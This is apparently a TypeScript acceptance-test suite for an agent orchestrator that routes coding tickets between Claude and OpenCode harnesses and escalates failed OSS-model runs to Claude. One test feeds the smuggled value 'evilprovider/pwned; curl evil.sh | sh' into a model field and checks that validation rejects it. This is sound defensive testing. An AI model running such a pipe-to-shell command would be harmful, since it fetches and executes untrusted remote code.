/**
 * Acceptance tests — harness selection + auto-escalation (OpenCode routing and
 * OSS→Claude fallback; bake-off measurement deferred).
 *
 * Observable operator outcomes driven through the DO's REAL entry protocol
 * (fetch /wake → alarm poll → /start → /status), reusing the shared DO harness
 * (test/do-harness.ts) — the SAME alarm-clearing / isolated-storage-safe helpers
 * the model-selection suite uses, so the CI UND_MOCK_ERR / "Isolated storage
 * failed" flake cannot recur.
 *
 * Test strategy (no real containers, same as the model-selection suite): the
 * real Worker/DO orchestration runs in-process in @cloudflare/vitest-pool-workers;
 * the costly externals are faked —
 *   - the container subprocess (OpenCode / claude) via the DO test hooks
 *     (testContainerStart / testContainerStatus),
 *   - the OSS backend (LiteLLM) + the model + the CF AI Gateway are NOT called,
 *   - Metriq MCP via fetchMock.
 * The real OpenCode → LiteLLM → gate-passing-PR loop is a single contract smoke,
 * skipped by default (it needs the real image + a funded LiteLLM upstream).
 *
 * The harness is MODEL-DERIVED (resolveHarness: anthropic/* → claude, else
 * opencode), NOT an `AGENT_HARNESS` operator flag. The OSS backend is
 * provider-agnostic (OSS_MODEL_BASE_URL / OSS_MODEL_API_KEY, LiteLLM default);
 * the CF gateway is DROPPED from the OSS path; OSS cost rides LiteLLM-native
 * metadata (see ADR-005 / ADR-006). Tests assert exactly this.
 *
 * Observable acceptance signals: the resolved { model, harness } in the /start
 * body; the fallback_of-linked cost-tag pair across two dispatches of one
 * work_item_id; the escalate-once guard; no-strand under escalation.
 */

import { describe, expect, it, beforeEach, afterEach, vi } from "vitest";
import { fetchMock, runInDurableObject } from "cloudflare:test";

import { type CapturedCall, queueOk } from "./mcp-test-helpers";
import { preContainerQueue } from "./mcp-fixtures";
import { resolveHarness, type Harness } from "../src/resolve-model";
import { buildContainerEnvVars } from "../src/agent-container";
import type { EscalationIntent } from "../src/agent-loop";
import {
  agentStub,
  cleanupTestState,
  clearAlarm,
  drive,
  fireAlarm,
  installContainerHooks,
  readStorage,
  seedStorage,
} from "./do-harness";

declare module "cloudflare:test" {
  interface ProvidedEnv {
    AGENT_LOOP: DurableObjectNamespace;
    AGENT_CONTAINER: DurableObjectNamespace;
    METRIQ_API_KEY: string;
    METRIQ_MCP_URL: string;
    RETRY_DELAY_MS: string;
    GITHUB_PAT: string;
    GITHUB_USER: string;
    ANTHROPIC_API_KEY: string;
    ALERT_GITHUB_REPO: string;
  }
}

// =============================================================================
// OpenCode behind model-prefix routing.
// End-to-end scenario first, then focused + error/edge scenarios.
// =============================================================================

describe("OpenCode harness via model-prefix routing", () => {
  beforeEach(() => {
    fetchMock.activate();
    fetchMock.disableNetConnect();
  });
  afterEach(cleanupTestState);

  // -------------------------------------------------------------------------
  // END-TO-END (exactly one). Drives the REAL DO through its real entry
  // protocol; faked MCP + faked container. Asserts the OBSERVABLE outcome: an
  // allow-listed OSS model routes to the opencode harness, the /start body
  // carries the OSS model + harness + OSS cost tags, the faked container
  // completes, and the dispatch reaches a terminal state (no-strand).
  // Litmus: delete the real DO path → no /start call → startBodies empty →
  // fails toHaveLength(1). Proves wiring, not a fake.
  // -------------------------------------------------------------------------

  it("dispatches an OSS ticket on the OpenCode harness and reaches a terminal state, OSS model + harness in the /start body", async () => {
    // GIVEN the operator configured an allow-listed OSS model as the fleet
    //   default, and a Metriq ticket "Add ETag caching to the catalog endpoint"
    //   is waiting (no per-ticket model).
    const calls: CapturedCall[] = [];
    const startBodies: string[] = [];
    queueOk(calls, [
      ...preContainerQueue({
        dispatchId: "d-oss-ws",
        workItemId: "wi-oss-ws",
        title: "Add ETag caching to the catalog endpoint",
      }),
      { artifact_id: "a-oss-ws", posted_at: "2026-05-28T09:00:00.000Z" },
      { error: null, blessingRequested: true },
    ]);

    const stub = agentStub("harness-oss-ws");
    await installContainerHooks(stub, {
      start: async (_d, body) => {
        startBodies.push(body);
        return { status: 202 };
      },
      status: async () => ({
        status: "done",
        stdoutTail: "https://github.com/example/target-repo/pull/4412\n",
      }),
    });
    // Operator-configured OSS fleet default (production sets it via the
    // AGENT_MODEL_DEFAULT secret; this test field mirrors testDailyCap).
    await seedDefaultModel(stub, "deepseek/deepseek-v3");

    // WHEN the operator wakes the agent and it dispatches the next ticket.
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    // THEN the container is told to run the OSS model on the OpenCode harness,
    //   both carried in the per-dispatch /start body.
    expect(startBodies).toHaveLength(1);
    const startBody = JSON.parse(startBodies[0]!);
    expect(startBody.model).toBe("deepseek/deepseek-v3");
    expect(startBody.harness).toBe("opencode");

    // AND the dispatch reached a terminal state (no-strand): PR reported, ticket
    //   moved to done.
    const names = calls.map((c) => JSON.parse(c.body).params.name);
    expect(names).toContain("report_artifact");
    expect(names[names.length - 1]).toBe("move_item");
    const finalMove = JSON.parse(calls[calls.length - 1]!.body).params.arguments;
    expect(finalMove.toState).toBe("done");
    // afterEach(cleanupTestState) wipes DO storage + alarm unconditionally.
  });

  // A per-ticket OSS override routes THAT dispatch to OpenCode while the fleet
  // default stays Claude (precedence + harness derive).
  it("routes a per-ticket OSS model to OpenCode while the Claude default is unchanged", async () => {
    const calls: CapturedCall[] = [];
    const startBodies: string[] = [];
    queueOk(calls, [
      ...preContainerQueue({
        dispatchId: "d-oss-ticket",
        workItemId: "wi-3090",
        title: "Add rate-limit headers to the API",
        ticketModel: "deepseek/deepseek-v3.2",
      }),
      { artifact_id: "a-oss-ticket", posted_at: "2026-05-28T09:00:00.000Z" },
      { error: null, blessingRequested: true },
    ]);
    const stub = agentStub("harness-oss-ticket");
    await installContainerHooks(stub, {
      start: async (_d, body) => {
        startBodies.push(body);
        return { status: 202 };
      },
      status: async () => ({
        status: "done",
        stdoutTail: "https://github.com/example/target-repo/pull/4413\n",
      }),
    });

    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    const startBody = JSON.parse(startBodies[0]!);
    expect(startBody.model).toBe("deepseek/deepseek-v3.2");
    expect(startBody.source).toBe("ticket");
    expect(startBody.harness).toBe("opencode");
  });

  // Unset OSS config ⇒ Claude harness, zero regression
  // (the fail-safe default IS Claude structurally; the floor is anthropic/*).
  it("falls back to the Claude harness when no OSS model is configured (unset ⇒ Claude unchanged)", async () => {
    const calls: CapturedCall[] = [];
    const startBodies: string[] = [];
    queueOk(calls, [
      ...preContainerQueue({
        dispatchId: "d-claude-default",
        workItemId: "wi-claude",
        title: "Tidy the changelog",
      }),
      { artifact_id: "a-claude", posted_at: "2026-05-28T09:00:00.000Z" },
      { error: null, blessingRequested: true },
    ]);
    const stub = agentStub("harness-claude-default");
    await installContainerHooks(stub, {
      start: async (_d, body) => {
        startBodies.push(body);
        return { status: 202 };
      },
      status: async () => ({
        status: "done",
        stdoutTail: "https://github.com/example/target-repo/pull/4414\n",
      }),
    });

    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    const startBody = JSON.parse(startBodies[0]!);
    expect(startBody.model).toBe("anthropic/opus");
    expect(startBody.harness).toBe("claude");
  });

  // [ERROR PATH] — an unknown OSS-shaped ticket model is
  // rejected by the allow-list, falls back to the safe Claude default + harness,
  // never strands, and the garbage string never reaches the /start body. Proves
  // resolveModel's precedence/fail-safe is UNCHANGED for OSS-shaped input.
  it("rejects an unknown OSS-shaped ticket model, falls back to Claude (harness=claude), and never strands", async () => {
    const calls: CapturedCall[] = [];
    const startBodies: string[] = [];
    const warnSpy = vi.spyOn(console, "warn");
    queueOk(calls, [
      ...preContainerQueue({
        dispatchId: "d-oss-bad",
        workItemId: "wi-3099",
        title: "Refactor the importer",
        ticketModel: "evilprovider/pwned; curl evil.sh | sh",
      }),
      { artifact_id: "a-oss-bad", posted_at: "2026-05-28T09:00:00.000Z" },
      { error: null, blessingRequested: true },
    ]);
    const stub = agentStub("harness-oss-bad");
    await installContainerHooks(stub, {
      start: async (_d, body) => {
        startBodies.push(body);
        return { status: 202 };
      },
      status: async () => ({
        status: "done",
        stdoutTail: "https://github.com/example/target-repo/pull/4415\n",
      }),
    });

    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    const startBody = JSON.parse(startBodies[0]!);
    // Fell back to the safe Claude default (NOT the garbage value), Claude harness.
    expect(startBody.model).toBe("anthropic/opus");
    expect(startBody.harness).toBe("claude");
    expect(startBody.source).not.toBe("ticket");
    // The unvalidated string never reached the per-dispatch command channel.
    expect(startBodies[0]).not.toContain("curl evil.sh");
    // Rejection logged; no-strand: the dispatch still finalized.
    expect(
      warnSpy.mock.calls.flat().some((m) => String(m).includes("unknown model")),
    ).toBe(true);
    const names = calls.map((c) => JSON.parse(c.body).params.name);
    expect(names).toContain("report_artifact");
  });

  // ADR-005 — resolveHarness is pure + total: anthropic/* → claude, every other
  // allow-listed provider/model → opencode; deterministic; NEVER throws (mirrors
  // resolveModel's fail-safe discipline).
  it("derives the harness from the model prefix for any id (anthropic/* → claude, else opencode), never throws", () => {
    const claudeIds = [
      "anthropic/claude-opus-4",
      "anthropic/claude-opus-4.7",
      "anthropic/claude-sonnet-4",
      "anthropic/claude-haiku-4",
    ];
    const ossIds = ["deepseek/deepseek-v3", "deepseek/deepseek-v3.2"];
    for (const id of claudeIds) {
      expect(resolveHarness(id)).toBe<Harness>("claude");
    }
    for (const id of ossIds) {
      expect(resolveHarness(id)).toBe<Harness>("opencode");
    }
    // Total: same input → same output, no throw, for any string.
    expect(() => resolveHarness("")).not.toThrow();
    expect(resolveHarness("deepseek/deepseek-v3")).toBe(
      resolveHarness("deepseek/deepseek-v3"),
    );
  });

  // ADR-006 — the OSS endpoint constants are forwarded into
  // the container env (OSS path). OSS_MODEL_BASE_URL is a constant (empty
  // default); OSS_MODEL_API_KEY is forwarded ONLY-WHEN-SET so the OpenCode
  // branch fails fast (→ escalates) when the key is absent. Pure builder; no I/O.
  it("forwards OSS_MODEL_BASE_URL as a constant and OSS_MODEL_API_KEY only when set", () => {
    const withKey = buildContainerEnvVars({
      GITHUB_PAT: "pat",
      GITHUB_USER: "agent",
      ANTHROPIC_API_KEY: "key",
      OSS_MODEL_BASE_URL: "https://litellm.internal/v1",
      OSS_MODEL_API_KEY: "sk-litellm-123",
    });
    expect(withKey.OSS_MODEL_BASE_URL).toBe("https://litellm.internal/v1");
    expect(withKey.OSS_MODEL_API_KEY).toBe("sk-litellm-123");
    // The GITHUB_PAT is still forwarded (separate git/gh path) — never via OSS.
    expect(withKey.GITHUB_PAT).toBe("pat");

    const withoutKey = buildContainerEnvVars({
      GITHUB_PAT: "pat",
      GITHUB_USER: "agent",
      ANTHROPIC_API_KEY: "key",
      OSS_MODEL_BASE_URL: "https://litellm.internal/v1",
    });
    // Key absent (not present-but-empty) ⇒ entrypoint.sh fails fast → escalates.
    expect("OSS_MODEL_API_KEY" in withoutKey).toBe(false);
  });
});

// =============================================================================
// Auto-escalation OSS → Claude. The error-path heart of the feature (most error
// coverage concentrates here).
// =============================================================================

describe("Auto-escalate a failed OSS dispatch to Claude", () => {
  beforeEach(() => {
    fetchMock.activate();
    fetchMock.disableNetConnect();
  });
  afterEach(cleanupTestState);

  // [ERROR PATH] — happy escalation. An OpenCode dispatch
  // fails via container EXIT CODE (faked status → failed, ADR-008 §1). The DO
  // records a work_item_id-keyed escalation intent (ADR-008 §2). On the SAME
  // work item's NEXT, separate delivery, the model is coerced to the Claude
  // floor (harness=claude, fallback_of=<failed OSS dispatch_id>) and the rescue
  // dispatch reaches a terminal state (no-strand). Two dispatch lifecycles via
  // DO storage — the load-bearing ADR-008 insight.
  it("records an escalation intent on an OSS exit-code failure, then re-dispatches the SAME ticket on Claude with fallback_of set", async () => {
    const stub = agentStub("escalate-happy");

    // --- Lifecycle 1: OSS dispatch fails via exit code ---
    const calls1: CapturedCall[] = [];
    queueOk(
      calls1,
      preContainerQueue({
        dispatchId: "d-oss-fail",
        workItemId: "wi-esc",
        title: "Add pagination to the audit log",
        ticketModel: "deepseek/deepseek-v3",
      }),
    );
    await installContainerHooks(stub, {
      start: async () => ({ status: 202 }),
      // OpenCode crashes / non-zero exit (ADR-008 §1 `failed` branch).
      status: async () => ({
        status: "failed",
        code: 1,
        bodyTail: "opencode run failed\n",
      }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);
    fetchMock.deactivate();

    // THEN a work_item_id-keyed escalation intent was recorded, pointing at the
    //   failed OSS dispatch (ADR-008 §2) — it survives to the next delivery.
    const intent = await readStorage<EscalationIntent>(stub, "escalation:wi-esc");
    expect(intent).toBeDefined();
    expect(intent!.failedDispatchId).toBe("d-oss-fail");
    expect(intent!.failedHarness).toBe("opencode");
    // The recorded intent's failedModel MUST be the REAL OSS model id that
    // failed (the cost bake-off roll-up keys on it) — never "". The dispatch
    // ran the allow-listed OSS model deepseek/deepseek-v3.
    expect(intent!.failedModel).toBe("deepseek/deepseek-v3");

    // --- Lifecycle 2: the SAME ticket is re-delivered (new dispatch_id) ---
    fetchMock.activate();
    fetchMock.disableNetConnect();
    const calls2: CapturedCall[] = [];
    const startBodies2: string[] = [];
    queueOk(calls2, [
      // Re-delivery: SAME work_item_id, NEW dispatch_id. Even if the ticket
      // STILL carries the OSS model, escalation coerces it to Claude.
      // The session from lifecycle 1 is still persisted in DO storage, so this
      // delivery does NOT re-register (ensureRegistered short-circuits, per the
      // register-once contract). Drop the leading register message so the
      // FIFO interceptor queue stays aligned with the real per-delivery call
      // order (wait → claim → get_item → move).
      ...preContainerQueue({
        dispatchId: "d-claude-rescue",
        workItemId: "wi-esc",
        title: "Add pagination to the audit log",
        ticketModel: "deepseek/deepseek-v3",
      }).slice(1),
      { artifact_id: "a-rescue", posted_at: "2026-05-28T09:05:00.000Z" },
      { error: null, blessingRequested: true },
    ]);
    await installContainerHooks(stub, {
      start: async (_d, body) => {
        startBodies2.push(body);
        return { status: 202 };
      },
      status: async () => ({
        status: "done",
        stdoutTail: "https://github.com/example/target-repo/pull/4420\n",
      }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    // THEN the rescue ran on the Claude floor (harness=claude), linked back to
    //   the failed OSS dispatch via fallback_of (ADR-007), and finalized.
    const rescueBody = JSON.parse(startBodies2[0]!);
    expect(rescueBody.harness).toBe("claude");
    expect(rescueBody.model).toBe("anthropic/opus");
    expect(rescueBody.cost_tags.fallback_of).toBe("d-oss-fail");
    const names2 = calls2.map((c) => JSON.parse(c.body).params.name);
    expect(names2).toContain("report_artifact");
    // afterEach(cleanupTestState) wipes DO storage + alarm unconditionally.
  });

  // [ERROR PATH] — escalate-once. After ONE escalation
  // (intent consumed-on-apply, ADR-008 §3-4), a SUBSEQUENT Claude-rescue failure
  // finds NO intent and does NOT re-escalate (no loop). Asserts the intent is
  // consumed (deleted) when applied.
  it("consumes the escalation intent on apply so a later Claude-rescue failure does NOT re-escalate (escalate-once)", async () => {
    const stub = agentStub("escalate-once");

    // Seed a pre-existing escalation intent (as if a prior OSS dispatch failed).
    await seedStorage(stub, "escalation:wi-once", {
      failedDispatchId: "d-oss-first",
      failedModel: "deepseek/deepseek-v3",
      failedHarness: "opencode",
      recordedAt: 1,
    } satisfies EscalationIntent);

    // Re-delivery of wi-once: escalation applies (→ Claude) AND is consumed.
    // The Claude rescue then ALSO fails (exit code) — but because the intent was
    // consumed and the harness is now claude (not opencode), NO new intent is
    // recorded (ADR-008 §4: the recording branch requires harness===opencode).
    const calls: CapturedCall[] = [];
    const startBodies: string[] = [];
    queueOk(
      calls,
      preContainerQueue({
        dispatchId: "d-claude-rescue-fail",
        workItemId: "wi-once",
        title: "Stabilize the exporter",
        ticketModel: "deepseek/deepseek-v3",
      }),
    );
    await installContainerHooks(stub, {
      start: async (_d, body) => {
        startBodies.push(body);
        return { status: 202 };
      },
      // The Claude rescue also fails.
      status: async () => ({
        status: "failed",
        code: 1,
        bodyTail: "claude rescue failed\n",
      }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    // THEN the rescue ran Claude (intent applied)…
    const rescueBody = JSON.parse(startBodies[0]!);
    expect(rescueBody.harness).toBe("claude");
    expect(rescueBody.cost_tags.fallback_of).toBe("d-oss-first");
    // …AND the intent was consumed — no escalation intent remains for wi-once,
    //   so the Claude-rescue failure falls through to today's terminal handling
    //   (no second escalation, no loop).
    const remaining = await readStorage<EscalationIntent>(
      stub,
      "escalation:wi-once",
    );
    expect(remaining).toBeUndefined();
  });

  // [ERROR PATH] — LiteLLM/OSS endpoint unavailable counts
  // as an OSS failure (the dial fails → non-zero exit, ADR-006 §3 SPOF). It
  // surfaces as the SAME `failed` branch → records an escalation intent. No new
  // failover mechanism — the SPOF rides the existing exit-code escalation.
  it("treats an unavailable LiteLLM backend (non-zero exit) as an OSS failure and records the escalation intent", async () => {
    const stub = agentStub("escalate-litellm-down");
    const calls: CapturedCall[] = [];
    queueOk(
      calls,
      preContainerQueue({
        dispatchId: "d-litellm-down",
        workItemId: "wi-spof",
        title: "Add caching headers",
        ticketModel: "deepseek/deepseek-v3",
      }),
    );
    await installContainerHooks(stub, {
      start: async () => ({ status: 202 }),
      // LiteLLM unreachable ⇒ OpenCode dial fails ⇒ non-zero exit.
      status: async () => ({
        status: "failed",
        code: 1,
        bodyTail: "connect ECONNREFUSED litellm.internal:443\n",
      }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    const intent = await readStorage<EscalationIntent>(
      stub,
      "escalation:wi-spof",
    );
    expect(intent).toBeDefined();
    expect(intent!.failedHarness).toBe("opencode");
  });

  // [ERROR PATH] — empty PR (no edits): OpenCode exits 0
  // but produces no PR URL (ADR-008 §1). finalizeDispatch
  // sees `done` + no URL → treated as an OSS failure → escalation intent recorded.
  it("treats an OpenCode empty PR (done, no URL) as an OSS failure and records the escalation intent", async () => {
    const stub = agentStub("escalate-empty-pr");
    const calls: CapturedCall[] = [];
    queueOk(
      calls,
      preContainerQueue({
        dispatchId: "d-empty-pr",
        workItemId: "wi-empty",
        title: "Add a feature flag",
        ticketModel: "deepseek/deepseek-v3",
      }),
    );
    await installContainerHooks(stub, {
      start: async () => ({ status: 202 }),
      // done, but stdout has NO URL → empty-PR failure.
      status: async () => ({
        status: "done",
        stdoutTail: "no changes were necessary\n",
      }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    const intent = await readStorage<EscalationIntent>(
      stub,
      "escalation:wi-empty",
    );
    expect(intent).toBeDefined();
    expect(intent!.failedDispatchId).toBe("d-empty-pr");
  });

  // [ERROR PATH] — watchdog: OpenCode hangs/overruns the
  // container wall-clock (ADR-008 §1). The monitor abandons it → records an
  // escalation intent so the next delivery runs Claude.
  it("escalates when an OpenCode dispatch overruns the watchdog (hung)", async () => {
    const stub = agentStub("escalate-watchdog");
    const calls: CapturedCall[] = [];
    queueOk(
      calls,
      preContainerQueue({
        dispatchId: "d-hang",
        workItemId: "wi-hang",
        title: "Migrate the schema",
        ticketModel: "deepseek/deepseek-v3",
      }),
    );
    // Container starts but never finishes — status stays running until the
    // watchdog trips (startedAt back-dated below).
    await installContainerHooks(stub, {
      start: async () => ({ status: 202 }),
      status: async () => ({ status: "running" }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    // IDLE fire: claim → move → start; currentDispatch stored with startedAt=now,
    // and a monitor-poll alarm armed. Fire the raw alarm (NOT the shared drive()
    // helper, which clears the alarm) so that armed monitor poll survives to fire
    // AFTER the back-date — mirroring the watchdog unit test (agent-loop.test.ts).
    // fireAlarm records the stub as armed for the leftover-alarm guard.
    await fireAlarm(stub);
    // Back-date startedAt so the next monitor poll trips the watchdog.
    await seedStorageMutate(stub);
    // MONITORING fire: status still running, but now − startedAt > max → watchdog
    // abandons → records the escalation intent before releasing the ticket.
    await fireAlarm(stub);

    const intent = await readStorage<EscalationIntent>(stub, "escalation:wi-hang");
    expect(intent).toBeDefined();
    expect(intent!.failedHarness).toBe("opencode");

    // No live alarm must survive (isolated-storage discipline). clearAlarm marks
    // the stub cleared so assertNoLeftoverAlarm (afterEach) passes.
    await clearAlarm(stub);
  });

  // [ERROR PATH] — no-strand preserved under escalation.
  // Even when the Claude rescue ALSO fails, the dispatch reaches the same
  // terminal state as today (released → sweeper / GH issue), and NO ticket is
  // stranded — the existing terminal/sweeper machinery is untouched (ADR-008 §5).
  it("does not strand a ticket even when the Claude rescue also fails (existing terminal machinery preserved)", async () => {
    const stub = agentStub("escalate-no-strand");
    // Pre-existing intent → this delivery is the Claude rescue, which fails.
    await seedStorage(stub, "escalation:wi-nostrand", {
      failedDispatchId: "d-oss-orig",
      failedModel: "deepseek/deepseek-v3",
      failedHarness: "opencode",
      recordedAt: 1,
    } satisfies EscalationIntent);
    const calls: CapturedCall[] = [];
    queueOk(
      calls,
      preContainerQueue({
        dispatchId: "d-claude-also-fail",
        workItemId: "wi-nostrand",
        title: "Fix the flaky test",
        ticketModel: "deepseek/deepseek-v3",
      }),
    );
    await installContainerHooks(stub, {
      start: async () => ({ status: 202 }),
      status: async () => ({
        status: "failed",
        code: 1,
        bodyTail: "claude also failed\n",
      }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    // THEN the dispatch was released exactly as today's terminal handling does
    //   (currentDispatch cleared, alarm re-armed for re-delivery / sweeper) — no
    //   strand. The existing pre-container MCP exchange ran to move-in-progress.
    const names = calls.map((c) => JSON.parse(c.body).params.name);
    expect(names).toEqual([
      "register_agent_session",
      "wait_for_assignment",
      "claim_assigned_task",
      "get_item",
      "move_item",
    ]);
    const current = await readStorage(stub, "currentDispatch");
    expect(current).toBeUndefined();
  });

  // [EDGE] — a Claude dispatch failure (NOT opencode) does
  // NOT record any escalation intent. Escalation is OSS-only (ADR-008 §3
  // idempotence guard: harness===opencode). A plain Claude failure is
  // released to the sweeper with no intent.
  it("does not record an escalation intent when a plain Claude dispatch fails (escalation is OSS-only)", async () => {
    const stub = agentStub("escalate-claude-noop");
    const calls: CapturedCall[] = [];
    queueOk(
      calls,
      preContainerQueue({
        dispatchId: "d-claude-fail",
        workItemId: "wi-claude-fail",
        title: "Patch the parser",
        // No ticketModel ⇒ Claude default ⇒ harness=claude.
      }),
    );
    await installContainerHooks(stub, {
      start: async () => ({ status: 202 }),
      status: async () => ({
        status: "failed",
        code: 1,
        bodyTail: "claude failed\n",
      }),
    });
    await stub.fetch("http://do/wake", { method: "POST" });
    await drive(stub);

    const intent = await readStorage<EscalationIntent>(
      stub,
      "escalation:wi-claude-fail",
    );
    expect(intent).toBeUndefined();
  });
});

// =============================================================================
// CONTRACT SMOKE (real external) — skipped by default. Escape hatch from the
// faked-externals strategy. The live OpenCode → LiteLLM → model →
// gate-passing-PR loop has not been exercised (no funded key). Deferred to
// deploy / bake-off — do NOT enable here.
// =============================================================================

describe("OpenCode → LiteLLM contract smoke [@requires_external]", () => {
  // Asserts a real OpenCode run dials the real LiteLLM/OSS endpoint, edits
  // files, pushes a lefthook-passing branch, and opens a real PR.
  // Requires the real container image + a funded LiteLLM upstream — out of
  // scope for the workers pool. Lives in deployed e2e.
  it.skip("real OpenCode produces a gate-passing PR via the LiteLLM backend [@requires_external]", () => {
    // Intentionally unimplemented in the workers pool; exercised in deployed e2e.
    expect(true).toBe(true);
  });
});

// ----- local helpers (thin; delegate to the shared harness) -----

/** Set the operator-configured fleet default model on the DO (mirrors testDailyCap). */
async function seedDefaultModel(
  stub: DurableObjectStub,
  model: string,
): Promise<void> {
  await runInDurableObject(stub, async (instance) => {
    (instance as { testAgentModelDefault?: string }).testAgentModelDefault =
      model;
  });
}

/** Back-date the in-flight dispatch's startedAt so the next poll trips the watchdog. */
async function seedStorageMutate(stub: DurableObjectStub): Promise<void> {
  await runInDurableObject(stub, async (_i, state) => {
    const cur = await state.storage.get<{ startedAt: number }>(
      "currentDispatch",
    );
    if (cur) {
      cur.startedAt = 0;
      await state.storage.put("currentDispatch", cur);
    }
  });
}
